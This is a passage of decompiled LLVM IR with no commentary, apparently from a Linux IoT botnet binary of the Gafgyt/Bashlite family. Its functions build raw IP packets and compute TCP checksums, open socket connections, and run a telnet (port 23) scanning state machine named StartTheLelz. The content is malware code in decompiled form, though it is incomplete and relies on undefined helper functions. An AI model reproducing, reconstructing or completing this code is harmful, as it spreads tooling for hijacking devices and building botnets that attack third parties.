  %v3_8049d5222 = udiv i32 %v4_8049d4c20, 65536
  %v4_8049d5223 = mul i32 %v4_8049d4f21, 65536
  %v5_8049d5224 = or i32 %v4_8049d5223, %v3_8049d5222
  %v2_8049d5625 = udiv i32 %v4_8049d4f21, 65536
  %v2_8049d5926 = or i32 %v5_8049d5224, %v2_8049d5625
  %v3_8049d5927 = icmp eq i32 %v2_8049d5926, 0
  %v1_8049d5d28 = icmp eq i1 %v3_8049d5927, false
  br i1 %v1_8049d5d28, label %dec_label_pc_8049d27, label %dec_label_pc_8049d5f

dec_label_pc_8049d27:                             ; preds = %dec_label_pc_8049d4c.preheader, %dec_label_pc_8049d27
  %v2_8049d5631 = phi i32 [ %v2_8049d56, %dec_label_pc_8049d27 ], [ %v2_8049d5625, %dec_label_pc_8049d4c.preheader ]
  %v5_8049d5230 = phi i32 [ %v5_8049d52, %dec_label_pc_8049d27 ], [ %v5_8049d5224, %dec_label_pc_8049d4c.preheader ]
  %v4_8049d4c29 = phi i32 [ %v4_8049d4c, %dec_label_pc_8049d27 ], [ %v4_8049d4c20, %dec_label_pc_8049d4c.preheader ]
  %v2_8049d42 = add i32 %v5_8049d5230, %v4_8049d4c29
  %v7_8049d42 = icmp ult i32 %v2_8049d42, %v4_8049d4c29
  %v3_8049d44 = zext i1 %v7_8049d42 to i32
  %v5_8049d44 = add nuw nsw i32 %v3_8049d44, %v2_8049d5631
  %sext = mul i32 %v2_8049d42, 65536
  %v4_8049d4c = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_8049d44, 65536
  %v4_8049d4f = sdiv i32 %sext50, 65536
  %v3_8049d52 = udiv i32 %v4_8049d4c, 65536
  %v5_8049d52 = or i32 %sext50, %v3_8049d52
  %v2_8049d56 = udiv i32 %v4_8049d4f, 65536
  %v2_8049d59 = or i32 %v5_8049d52, %v2_8049d56
  %v3_8049d59 = icmp eq i32 %v2_8049d59, 0
  %v1_8049d5d = icmp eq i1 %v3_8049d59, false
  br i1 %v1_8049d5d, label %dec_label_pc_8049d27, label %dec_label_pc_8049d4c.dec_label_pc_8049d5f_crit_edge

dec_label_pc_8049d4c.dec_label_pc_8049d5f_crit_edge: ; preds = %dec_label_pc_8049d27
  store i32 %v5_8049d5230, i32* @ecx, align 4
  br label %dec_label_pc_8049d5f

dec_label_pc_8049d5f:                             ; preds = %dec_label_pc_8049d4c.dec_label_pc_8049d5f_crit_edge, %dec_label_pc_8049d4c.preheader
  %v4_8049d4c.lcssa = phi i32 [ %v4_8049d4c, %dec_label_pc_8049d4c.dec_label_pc_8049d5f_crit_edge ], [ %v4_8049d4c20, %dec_label_pc_8049d4c.preheader ]
  %v1_8049d62 = urem i32 %v4_8049d4c.lcssa, 65536
  %v1_8049d64 = xor i32 %v1_8049d62, 65535
  store i32 %v0_8049cce, i32* @ebx, align 4
  ret i32 %v1_8049d64

; uselistorder directives
  uselistorder i32 %v5_8049d52, { 1, 0 }
  uselistorder i32 %v4_8049d4c, { 1, 0, 2 }
  uselistorder i32 %v2_8049d5625, { 1, 0 }
  uselistorder i32 %v4_8049d4f21, { 1, 0 }
  uselistorder i32 %v4_8049d4c20, { 2, 1, 0 }
  uselistorder i32 %v4_8049d1f, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_8049cf4.lcssa, { 1, 0 }
  uselistorder i32 %v4_8049d02, { 1, 0 }
  uselistorder i32 %v6_8049cf4, { 1, 2, 0 }
  uselistorder i32 %v4_8049cf4, { 1, 0 }
  uselistorder i32 %v6_8049ce5, { 1, 0 }
  uselistorder label %dec_label_pc_8049d27, { 1, 0 }
  uselistorder label %dec_label_pc_8049ce2, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %v1_8049d85 = add i32 %tmp9, 12
  %v2_8049d85 = inttoptr i32 %v1_8049d85 to i32*
  %v3_8049d85 = load i32, i32* %v2_8049d85, align 4
  %v1_8049d8e = add i32 %tmp9, 16
  %v2_8049d8e = inttoptr i32 %v1_8049d8e to i32*
  %v3_8049d8e = load i32, i32* %v2_8049d8e, align 4
  %v1_8049da1 = call i32 @htons(i32 20)
  %v1_8049dbb = call i32 @malloc(i32 32)
  store i32 %v1_8049dbb, i32* %ecx.global-to-local, align 4
  %v2_8049dce = inttoptr i32 %v1_8049dbb to i32*
  store i32 %v3_8049d85, i32* %v2_8049dce, align 4
  %v1_8049dd3 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049dd3 = add i32 %v1_8049dd3, 4
  %v3_8049dd3 = inttoptr i32 %v2_8049dd3 to i32*
  store i32 %v3_8049d8e, i32* %v3_8049dd3, align 4
  %v1_8049dd9 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049dd9 = add i32 %v1_8049dd9, 8
  %v3_8049dd9 = inttoptr i32 %v2_8049dd9 to i32*
  store i32 0, i32* %v3_8049dd9, align 4
  store i32 %tmp1, i32* @ecx, align 4
  %v1_8049de2 = add i32 %v1_8049dbb, 12
  store i32 %v1_8049de2, i32* %edx.global-to-local, align 4
  %v1_8049de5 = inttoptr i32 %tmp1 to i32*
  %v2_8049de5 = load i32, i32* %v1_8049de5, align 4
  %v2_8049de7 = inttoptr i32 %v1_8049de2 to i32*
  store i32 %v2_8049de5, i32* %v2_8049de7, align 4
  %v0_8049de9 = load i32, i32* @ecx, align 4
  %v1_8049de9 = add i32 %v0_8049de9, 4
  %v2_8049de9 = inttoptr i32 %v1_8049de9 to i32*
  %v3_8049de9 = load i32, i32* %v2_8049de9, align 4
  %v1_8049dec = load i32, i32* %edx.global-to-local, align 4
  %v2_8049dec = add i32 %v1_8049dec, 4
  %v3_8049dec = inttoptr i32 %v2_8049dec to i32*
  store i32 %v3_8049de9, i32* %v3_8049dec, align 4
  %v0_8049def = load i32, i32* @ecx, align 4
  %v1_8049def = add i32 %v0_8049def, 8
  %v2_8049def = inttoptr i32 %v1_8049def to i32*
  %v3_8049def = load i32, i32* %v2_8049def, align 4
  %v1_8049df2 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049df2 = add i32 %v1_8049df2, 8
  %v3_8049df2 = inttoptr i32 %v2_8049df2 to i32*
  store i32 %v3_8049def, i32* %v3_8049df2, align 4
  %v0_8049df5 = load i32, i32* @ecx, align 4
  %v1_8049df5 = add i32 %v0_8049df5, 12
  %v2_8049df5 = inttoptr i32 %v1_8049df5 to i32*
  %v3_8049df5 = load i32, i32* %v2_8049df5, align 4
  %v1_8049df8 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049df8 = add i32 %v1_8049df8, 12
  %v3_8049df8 = inttoptr i32 %v2_8049df8 to i32*
  store i32 %v3_8049df5, i32* %v3_8049df8, align 4
  %v0_8049dfb = load i32, i32* @ecx, align 4
  %v1_8049dfb = add i32 %v0_8049dfb, 16
  %v2_8049dfb = inttoptr i32 %v1_8049dfb to i32*
  %v3_8049dfb = load i32, i32* %v2_8049dfb, align 4
  %v1_8049dfe = load i32, i32* %edx.global-to-local, align 4
  %v2_8049dfe = add i32 %v1_8049dfe, 16
  %v3_8049dfe = inttoptr i32 %v2_8049dfe to i32*
  store i32 %v3_8049dfb, i32* %v3_8049dfe, align 4
  %v2_8049e07 = inttoptr i32 %v1_8049dbb to i16*
  %v3_8049e07 = call i32 @csum(i16* %v2_8049e07, i32 32)
  %v1_8049e19 = call i32 @free(i32 %v1_8049dbb)
  %v4_8049e21 = urem i32 %v3_8049e07, 65536
  ret i32 %v4_8049e21

; uselistorder directives
  uselistorder i32 %v1_8049dbb, { 2, 3, 4, 1, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp1, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_8049e2c = load i32, i32* @ebp, align 4
  store i32 %v0_8049e2c, i32* %stack_var_-4, align 4
  %v4_8049e32 = sext i8 %tmp8 to i32
  %v4_8049e38 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_8049e55 = add i32 %v4_8049e38, 1
  %v2_8049e55 = inttoptr i32 %v1_8049e55 to i8*
  store i8 0, i8* %v2_8049e55, align 1
  %v1_8049e5c = add i32 %tmp5, 20
  %v1_8049e62 = trunc i32 %v1_8049e5c to i16
  %v3_8049e62 = add i32 %v4_8049e38, 2
  %v4_8049e62 = inttoptr i32 %v3_8049e62 to i16*
  store i16 %v1_8049e62, i16* %v4_8049e62, align 2
  %v2_8049e66 = call i32 @rand_cmwc(i32 %v4_8049e32)
  %v1_8049e70 = trunc i32 %v2_8049e66 to i16
  %v3_8049e70 = add i32 %v4_8049e38, 4
  %v4_8049e70 = inttoptr i32 %v3_8049e70 to i16*
  store i16 %v1_8049e70, i16* %v4_8049e70, align 2
  %v1_8049e77 = add i32 %v4_8049e38, 6
  %v2_8049e77 = inttoptr i32 %v1_8049e77 to i16*
  store i16 0, i16* %v2_8049e77, align 2
  %v1_8049e80 = add i32 %v4_8049e38, 8
  %v2_8049e80 = inttoptr i32 %v1_8049e80 to i8*
  store i8 -1, i8* %v2_8049e80, align 1
  %v3_8049e8a = add i32 %v4_8049e38, 9
  %v4_8049e8a = inttoptr i32 %v3_8049e8a to i8*
  store i8 %tmp8, i8* %v4_8049e8a, align 1
  %v1_8049e90 = add i32 %v4_8049e38, 10
  %v2_8049e90 = inttoptr i32 %v1_8049e90 to i16*
  store i16 0, i16* %v2_8049e90, align 2
  %v2_8049e9c = add i32 %v4_8049e38, 12
  %v3_8049e9c = inttoptr i32 %v2_8049e9c to i32*
  %v2_8049ea5 = add i32 %v4_8049e38, 16
  %v3_8049ea5 = inttoptr i32 %v2_8049ea5 to i32*
  store i32 %tmp, i32* %v3_8049ea5, align 4
  %v2_8049ea8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049ea8, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 3, 0, 1, 2 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8049eb0 = add i32 %arg1, -2
  %v9_8049eb0 = sub i32 1, %arg1
  %v10_8049eb0 = and i32 %v9_8049eb0, %arg1
  %v11_8049eb0 = icmp slt i32 %v10_8049eb0, 0
  %v12_8049eb0 = icmp eq i32 %v4_8049eb0, 0
  %v13_8049eb0 = icmp slt i32 %v4_8049eb0, 0
  %v3_8049eb4 = icmp eq i1 %v13_8049eb0, %v11_8049eb0
  %v4_8049eb4 = icmp eq i1 %v12_8049eb0, false
  %v5_8049eb4 = and i1 %v4_8049eb4, %v3_8049eb4
  br i1 %v5_8049eb4, label %dec_label_pc_8049ebf, label %dec_label_pc_8049ed4

dec_label_pc_8049ebf:                             ; preds = %entry
  %v1_8049ec5 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_8049ed4

dec_label_pc_8049ed4:                             ; preds = %entry, %dec_label_pc_8049ebf
  %storemerge = phi i32 [ 0, %dec_label_pc_8049ebf ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049eb0, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049ed4, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_8049ef3 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_8049efe = icmp eq i32 %v1_8049ef3, 0
  %v1_8049f02 = icmp eq i1 %v4_8049efe, false
  br i1 %v1_8049f02, label %dec_label_pc_8049f10, label %dec_label_pc_8049f04

dec_label_pc_8049f04:                             ; preds = %entry
  br label %dec_label_pc_8049fb5

dec_label_pc_8049f10:                             ; preds = %entry
  %v1_8049f13 = add i32 %v1_8049ef3, 12
  %v2_8049f13 = inttoptr i32 %v1_8049f13 to i32*
  %v3_8049f13 = load i32, i32* %v2_8049f13, align 4
  %v1_8049f1b = add i32 %v1_8049ef3, 16
  %v2_8049f1b = inttoptr i32 %v1_8049f1b to i32*
  %v3_8049f1b = load i32, i32* %v2_8049f1b, align 4
  %v1_8049f1e = inttoptr i32 %v3_8049f1b to i32*
  %v2_8049f1e = load i32, i32* %v1_8049f1e, align 4
  %v15_8049f27 = ptrtoint i32* %stack_var_-24 to i32
  %v3_8049f2c = call i32 @bcopy(i32 %v2_8049f1e, i32 %v15_8049f27, i32 %v3_8049f13)
  %v1_8049f371 = zext i16 %arg2 to i32
  %v1_8049f40 = call i32 @htons(i32 %v1_8049f371)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_8049f5b = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_8049f66 = ptrtoint i32* %stack_var_-32 to i32
  %v5_8049f76 = call i32 @__GI_setsockopt(i32 %v3_8049f5b, i32 6, i32 1, i32 %v2_8049f66, i32 4)
  %v13_8049f7e = icmp eq i32 %v3_8049f5b, -1
  %v1_8049f82 = icmp eq i1 %v13_8049f7e, false
  br i1 %v1_8049f82, label %dec_label_pc_8049f8d, label %dec_label_pc_8049f84

dec_label_pc_8049f84:                             ; preds = %dec_label_pc_8049f10
  br label %dec_label_pc_8049fb5

dec_label_pc_8049f8d:                             ; preds = %dec_label_pc_8049f10
  %v2_8049f24 = ptrtoint i32* %stack_var_-28 to i32
  %v3_8049f99 = call i32 @__libc_connect(i32 %v3_8049f5b, i32 %v2_8049f24, i32 16)
  %v10_8049fa1 = icmp eq i32 %v3_8049f99, -1
  %v1_8049fa4 = icmp eq i1 %v10_8049fa1, false
  br i1 %v1_8049fa4, label %dec_label_pc_8049faf, label %dec_label_pc_8049fa6

dec_label_pc_8049fa6:                             ; preds = %dec_label_pc_8049f8d
  br label %dec_label_pc_8049fb5

dec_label_pc_8049faf:                             ; preds = %dec_label_pc_8049f8d
  br label %dec_label_pc_8049fb5

dec_label_pc_8049fb5:                             ; preds = %dec_label_pc_8049fa6, %dec_label_pc_8049f84, %dec_label_pc_8049f04, %dec_label_pc_8049faf
  %v3_8049fb5 = phi i32 [ 0, %dec_label_pc_8049fa6 ], [ 0, %dec_label_pc_8049f84 ], [ 0, %dec_label_pc_8049f04 ], [ %v3_8049f5b, %dec_label_pc_8049faf ]
  ret i32 %v3_8049fb5

; uselistorder directives
  uselistorder i32 %v3_8049f5b, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_8049fb5, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-636 = alloca i32, align 4
  %v15_8049fc0 = ptrtoint i32* %stack_var_-636 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8049fd1 = call i32 @__GI_time(i32* null)
  store i32 %v2_8049fd1, i32* %eax.global-to-local, align 4
  store i32 %v2_8049fd1, i32* @ebx, align 4
  %v1_8049fdb = call i32 @rand_cmwc(i32 0)
  %v1_8049fe0 = load i32, i32* @ebx, align 4
  %v2_8049fe0 = xor i32 %v1_8049fe0, %v1_8049fdb
  store i32 %v2_8049fe0, i32* @eax, align 4
  %v1_8049fe6 = call i32 @srand(i32 %v2_8049fe0)
  store i32 %v1_8049fe6, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-604, align 4
  %v1_8049ffc = call i32 @htons(i32 23)
  %v2_804a00b = ptrtoint i32* %stack_var_-604 to i32
  %v15_804a011 = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v15_804a011, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-596, align 4
  %v1_804a029 = call i32 @malloc(i32 1025)
  store i32 %v1_804a029, i32* %edx.global-to-local, align 4
  store i32 1025, i32* %eax.global-to-local, align 4
  %v3_804a045 = inttoptr i32 %v1_804a029 to i8*
  %v4_804a045 = call i32 @__GI_memset(i8* %v3_804a045, i32 0, i32 1025)
  %v2_804a05e = mul i32 %arg2, 28
  %v1_804a063 = add i32 %v2_804a05e, 30
  %v2_804a066 = and i32 %v1_804a063, -16
  %v2_804a06c = sub i32 %v15_8049fc0, %v2_804a066
  %v1_804a07a = add i32 %v2_804a06c, 15
  %v2_804a07d = and i32 %v1_804a07a, -16
  %v2_804a09a = mul i32 %arg2, 5
  store i32 %v2_804a09a, i32* %edx.global-to-local, align 4
  %v1_804a0a0 = inttoptr i32 %v2_804a07d to i8*
  store i32 %v2_804a07d, i32* @edi, align 4
  %v1_804a0a5 = and i32 %v1_804a07a, -256
  store i32 %v1_804a0a5, i32* %eax.global-to-local, align 4
  %v5_804a0a7 = call i8* @_memset(i8* %v1_804a0a0, i32 %v1_804a0a5, i32 %v2_804a09a)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a13450 = icmp sgt i32 %arg2, 0
  br i1 %v5_804a13450, label %dec_label_pc_804a0b2.lr.ph, label %dec_label_pc_804a141

dec_label_pc_804a0b2.lr.ph:                       ; preds = %entry
  %v2_804a106 = or i32 %v2_804a07d, 9
  br label %dec_label_pc_804a0b2

dec_label_pc_804a0b2:                             ; preds = %dec_label_pc_804a0b2, %dec_label_pc_804a0b2.lr.ph
  %storemerge251 = phi i32 [ 0, %dec_label_pc_804a0b2.lr.ph ], [ %v4_804a12b, %dec_label_pc_804a0b2 ]
  %v2_804a0c6 = mul i32 %storemerge251, 28
  %v2_804a0c8 = add i32 %v2_804a0c6, %v2_804a07d
  store i32 %v2_804a0c8, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804a0d0 = inttoptr i32 %v2_804a0c8 to i32*
  store i32 0, i32* %v2_804a0d0, align 4
  %v0_804a0d2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0d2 = add i32 %v0_804a0d2, 4
  store i32 %v1_804a0d2, i32* %eax.global-to-local, align 4
  %v0_804a0d5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0d5 = inttoptr i32 %v1_804a0d2 to i32*
  store i32 %v0_804a0d5, i32* %v2_804a0d5, align 4
  %v0_804a0d7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0d7 = add i32 %v0_804a0d7, 4
  store i32 %v1_804a0d7, i32* %eax.global-to-local, align 4
  %v0_804a0da = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0da = inttoptr i32 %v1_804a0d7 to i32*
  store i32 %v0_804a0da, i32* %v2_804a0da, align 4
  %v0_804a0dc = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0dc = add i32 %v0_804a0dc, 4
  store i32 %v1_804a0dc, i32* %eax.global-to-local, align 4
  %v0_804a0df = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0df = inttoptr i32 %v1_804a0dc to i32*
  store i32 %v0_804a0df, i32* %v2_804a0df, align 4
  %v0_804a0e1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0e1 = add i32 %v0_804a0e1, 4
  store i32 %v1_804a0e1, i32* %eax.global-to-local, align 4
  %v0_804a0e4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0e4 = inttoptr i32 %v1_804a0e1 to i32*
  store i32 %v0_804a0e4, i32* %v2_804a0e4, align 4
  %v0_804a0e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0e6 = add i32 %v0_804a0e6, 4
  store i32 %v1_804a0e6, i32* %eax.global-to-local, align 4
  %v0_804a0e9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0e9 = inttoptr i32 %v1_804a0e6 to i32*
  store i32 %v0_804a0e9, i32* %v2_804a0e9, align 4
  %v0_804a0eb = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0eb = add i32 %v0_804a0eb, 4
  %v0_804a0ee = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0ee = inttoptr i32 %v1_804a0eb to i32*
  store i32 %v0_804a0ee, i32* %v2_804a0ee, align 4
  %v3_804a106 = add i32 %v2_804a106, %v2_804a0c6
  %v4_804a106 = inttoptr i32 %v3_804a106 to i8*
  store i8 1, i8* %v4_804a106, align 1
  %v1_804a123 = add i32 %v2_804a0c8, 24
  store i32 %v1_804a123, i32* %edx.global-to-local, align 4
  %v2_804a129 = inttoptr i32 %v1_804a123 to i32*
  store i32 %v1_804a029, i32* %v2_804a129, align 4
  %v4_804a12b = add nuw nsw i32 %storemerge251, 1
  store i32 %v4_804a12b, i32* %eax.global-to-local, align 4
  %exitcond52 = icmp eq i32 %v4_804a12b, %arg2
  br i1 %exitcond52, label %dec_label_pc_804a141, label %dec_label_pc_804a0b2

dec_label_pc_804a141:                             ; preds = %entry, %dec_label_pc_804a0b2, %dec_label_pc_804a141
  %stack_var_-48.0 = phi i32 [ %v4_804a141, %dec_label_pc_804a141 ], [ 0, %dec_label_pc_804a0b2 ], [ 0, %entry ]
  %v4_804a141 = add i32 %stack_var_-48.0, 1
  store i32 %v4_804a141, i32* %eax.global-to-local, align 4
  %v1_804a147 = mul i32 %v4_804a141, 4
  %v2_804a147 = add i32 %v1_804a147, ptrtoint ([10 x i8*]* @global_var_8059e00.52 to i32)
  %v3_804a147 = inttoptr i32 %v2_804a147 to i32*
  %v4_804a147 = load i32, i32* %v3_804a147, align 4
  store i32 %v4_804a147, i32* %eax.global-to-local, align 4
  %v1_804a14e = icmp eq i32 %v4_804a147, 0
  %v1_804a150 = icmp eq i1 %v1_804a14e, false
  br i1 %v1_804a150, label %dec_label_pc_804a141, label %dec_label_pc_804a152.preheader

dec_label_pc_804a152.preheader:                   ; preds = %dec_label_pc_804a141
  %v2_804a4e8 = ptrtoint i32* %stack_var_-316 to i32
  %tmp38 = bitcast i32* %stack_var_-316 to i8*
  %v2_804a56b = ptrtoint i32* %stack_var_-324 to i32
  %v2_804a5c3 = ptrtoint i32* %stack_var_-328 to i32
  %v2_804a5ca = ptrtoint i32* %stack_var_-332 to i32
  %v2_804a1c3 = or i32 %v2_804a07d, 8
  %v2_804a206 = or i32 %v2_804a07d, 9
  %v2_804a2f1 = or i32 %v2_804a07d, 11
  %v2_804a32b = or i32 %v2_804a07d, 10
  %v2_804acaa = add i32 %v2_804a07d, 16
  br label %dec_label_pc_804a152

dec_label_pc_804a152:                             ; preds = %dec_label_pc_804a152, %dec_label_pc_804b021, %dec_label_pc_804a152.preheader
  %stack_var_-624.0 = phi i32 [ %tmp4, %dec_label_pc_804a152.preheader ], [ %stack_var_-624.0, %dec_label_pc_804a152 ], [ %stack_var_-624.1, %dec_label_pc_804b021 ]
  %stack_var_-620.0 = phi i32 [ %tmp5, %dec_label_pc_804a152.preheader ], [ %stack_var_-620.0, %dec_label_pc_804a152 ], [ %stack_var_-620.1, %dec_label_pc_804b021 ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804a13450, label %dec_label_pc_804a15e, label %dec_label_pc_804a152

dec_label_pc_804a15e:                             ; preds = %dec_label_pc_804a152, %dec_label_pc_804b021
  %storemerge45 = phi i32 [ %v4_804b021, %dec_label_pc_804b021 ], [ 0, %dec_label_pc_804a152 ]
  %stack_var_-620.244 = phi i32 [ %stack_var_-620.1, %dec_label_pc_804b021 ], [ %stack_var_-620.0, %dec_label_pc_804a152 ]
  %stack_var_-624.243 = phi i32 [ %stack_var_-624.1, %dec_label_pc_804b021 ], [ %stack_var_-624.0, %dec_label_pc_804a152 ]
  %v1_804a164 = mul i32 %storemerge45, 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  %v2_804a172 = mul i32 %storemerge45, 28
  %v2_804a174 = add i32 %v2_804a172, %v2_804a07d
  %v1_804a176 = add i32 %v2_804a174, 16
  store i32 %v1_804a176, i32* %eax.global-to-local, align 4
  %v1_804a179 = inttoptr i32 %v1_804a176 to i32*
  %v2_804a179 = load i32, i32* %v1_804a179, align 4
  store i32 %v2_804a179, i32* %eax.global-to-local, align 4
  %v1_804a17b = icmp eq i32 %v2_804a179, 0
  %v1_804a17d = icmp eq i1 %v1_804a17b, false
  br i1 %v1_804a17d, label %dec_label_pc_804a1ad, label %dec_label_pc_804a17f

dec_label_pc_804a17f:                             ; preds = %dec_label_pc_804a15e
  store i32 %storemerge45, i32* @ebx, align 4
  %v0_804a182 = load i32, i32* @esp, align 4
  %v1_804a185 = add i32 %v0_804a182, -16
  %v2_804a185 = inttoptr i32 %v1_804a185 to i32*
  store i32 0, i32* %v2_804a185, align 4
  %v1_804a187 = inttoptr i32 %storemerge45 to i32*
  %v2_804a187 = call i32 @__GI_time(i32* %v1_804a187)
  store i32 %v2_804a187, i32* @esi, align 4
  %v0_804a194 = load i32, i32* @ebx, align 4
  %v1_804a196 = mul i32 %v0_804a194, 4
  store i32 %v1_804a196, i32* %edx.global-to-local, align 4
  %v2_804a1a4 = mul i32 %v0_804a194, 28
  %v2_804a1a6 = add i32 %v2_804a1a4, %v2_804a07d
  %v1_804a1a8 = add i32 %v2_804a1a6, 16
  store i32 %v1_804a1a8, i32* %eax.global-to-local, align 4
  %v2_804a1ab = inttoptr i32 %v1_804a1a8 to i32*
  store i32 %v2_804a187, i32* %v2_804a1ab, align 4
  br label %dec_label_pc_804a1ad

dec_label_pc_804a1ad:                             ; preds = %dec_label_pc_804a15e, %dec_label_pc_804a17f
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a1c3 = add i32 %v2_804a1c3, %v2_804a172
  %v4_804a1c3 = inttoptr i32 %v3_804a1c3 to i8*
  %v5_804a1c3 = load i8, i8* %v4_804a1c3, align 4
  %v6_804a1c3 = zext i8 %v5_804a1c3 to i32
  %v8_804a1c3 = and i32 %v2_804a172, -256
  %v9_804a1c3 = or i32 %v6_804a1c3, %v8_804a1c3
  store i32 %v9_804a1c3, i32* %eax.global-to-local, align 4
  store i32 %v6_804a1c3, i32* %edx.global-to-local, align 4
  store i32 %v6_804a1c3, i32* @edi, align 4
  %v1_804a1e7 = mul nuw nsw i32 %v6_804a1c3, 4
  %v2_804a1e7 = add nuw nsw i32 %v1_804a1e7, 134570472
  %v3_804a1e7 = inttoptr i32 %v2_804a1e7 to i32*
  %v4_804a1e7 = load i32, i32* %v3_804a1e7, align 4
  store i32 %v4_804a1e7, i32* %eax.global-to-local, align 4
  switch i8 %v5_804a1c3, label %dec_label_pc_804b021 [
    i8 0, label %dec_label_pc_804a1f0
    i8 1, label %dec_label_pc_804a4de
    i8 2, label %dec_label_pc_804a723
    i8 3, label %dec_label_pc_804a85f
    i8 4, label %dec_label_pc_804a9a7
    i8 5, label %dec_label_pc_804aae3
    i8 6, label %dec_label_pc_804ac2b
    i8 7, label %dec_label_pc_804aec5
  ]

dec_label_pc_804a1f0:                             ; preds = %dec_label_pc_804a1ad
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a206 = add i32 %v2_804a206, %v2_804a172
  %v4_804a206 = inttoptr i32 %v3_804a206 to i8*
  %v5_804a206 = load i8, i8* %v4_804a206, align 1
  %v10_804a20a = icmp eq i8 %v5_804a206, 1
  %v1_804a20c = icmp eq i1 %v10_804a20a, false
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  br i1 %v1_804a20c, label %dec_label_pc_804a2bb, label %dec_label_pc_804a212

dec_label_pc_804a212:                             ; preds = %dec_label_pc_804a1f0
  %v1_804a22a = add i32 %v2_804a174, 24
  store i32 %v1_804a22a, i32* %eax.global-to-local, align 4
  %v1_804a22d = inttoptr i32 %v1_804a22a to i32*
  %v2_804a22d = load i32, i32* %v1_804a22d, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804a250 = inttoptr i32 %v2_804a174 to i32*
  store i32 0, i32* %v2_804a250, align 4
  %v0_804a252 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a252 = add i32 %v0_804a252, 4
  store i32 %v1_804a252, i32* %eax.global-to-local, align 4
  %v0_804a255 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a255 = inttoptr i32 %v1_804a252 to i32*
  store i32 %v0_804a255, i32* %v2_804a255, align 4
  %v0_804a257 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a257 = add i32 %v0_804a257, 4
  store i32 %v1_804a257, i32* %eax.global-to-local, align 4
  %v0_804a25a = load i32, i32* %edx.global-to-local, align 4
  %v2_804a25a = inttoptr i32 %v1_804a257 to i32*
  store i32 %v0_804a25a, i32* %v2_804a25a, align 4
  %v0_804a25c = load i32, i32* %eax.global-to-local, align 4
  %v1_804a25c = add i32 %v0_804a25c, 4
